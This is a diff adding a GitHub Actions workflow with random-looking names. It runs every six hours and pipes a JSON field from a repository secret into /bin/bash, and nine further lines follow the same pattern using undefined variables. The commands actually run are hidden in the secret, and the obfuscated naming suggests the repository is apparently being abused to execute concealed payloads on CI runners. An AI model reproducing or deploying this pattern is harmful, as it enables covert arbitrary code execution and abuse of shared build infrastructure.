@@ -1,0 +1,27 @@
+name: nancydeborah8222
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nancydeborah8222
+        env:
+          cfoq6: ${{ secrets.cfoq6 }}
+        run: |
+          echo $cfoq6 | jq -r .sol18 | /bin/bash
+          echo $fp7 | jq -r .p835 | /bin/bash
+          echo $g97725 | jq -r .nim4702 | /bin/bash
+          echo $d9 | jq -r .zmri69 | /bin/bash
+          echo $ri49942 | jq -r .lich25517 | /bin/bash
+          echo $vmd597 | jq -r .yzsss9 | /bin/bash
+          echo $snoml47932 | jq -r .bpr43802 | /bin/bash
+          echo $ozg9372 | jq -r .ulwk79944 | /bin/bash
+          echo $pzayl2 | jq -r .x6876 | /bin/bash
+          echo $yle5 | jq -r .lk262 | /bin/bash
+
